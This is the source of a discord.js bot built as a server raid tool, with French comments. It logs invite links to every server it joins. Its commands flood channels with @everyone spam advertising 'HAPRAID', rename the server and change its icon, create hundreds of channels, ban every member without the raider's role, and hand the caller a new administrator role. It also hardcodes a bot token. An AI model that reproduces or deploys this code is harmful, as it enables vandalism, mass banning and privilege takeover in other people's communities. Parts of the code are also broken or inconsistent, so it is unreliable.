const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "NDM3NzQzNTYyMTgwNzg4MjQx.Db6gAQ.un6SC55jJHsCOJ6B4qfbc9dlSH0";
var prefix = ".";
var mention = "126connect�s"

var fucked = false;
 
bot.on('ready',() => {
    //invit link
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connect� sur : ${guild.name} ${invite}`));
    })
});
 
bot.on('msg', msg => {
  //#region Legit
  /* Commandes legit */
  if (msg.content === '.ping') {
    msg.reply('pong !')
  }
  //#endregion
 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === 'des') {
    console.log(`Commande .des par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/EAJbZCR https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
     }, 500).catch(e => {});
  }
 
  if (msg.content === 'des') {
    console.log(`Commande .oupss par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setIcon("./hapraid.png").catch(e => {});
      msg.guild.setName('RAID BY HAPRAID').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('hapraid_vous_remercie', 'voice').catch(e => {});
        msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.ban') {
    console.log(`Commande .bane par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "haprole",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});

bot.login('NDM3NzQzNTYyMTgwNzg4MjQx.Db6gAQ.un6SC55jJHsCOJ6B4qfbc9dlSH0')